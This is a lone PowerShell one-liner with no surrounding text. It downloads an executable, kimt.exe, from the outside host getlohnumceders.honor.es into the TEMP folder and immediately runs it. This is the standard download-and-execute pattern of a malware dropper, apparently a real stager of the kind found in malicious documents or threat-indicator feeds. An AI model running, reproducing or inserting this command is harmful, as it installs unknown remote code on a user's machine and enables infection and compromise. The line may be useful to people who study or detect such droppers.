
(New-Object System.Net.WebClient).DownloadFile('http://getlohnumceders.honor.es/kimt.exe',"$env:TEMP\kimt.exe");Start-Process ("$env:TEMP\kimt.exe")

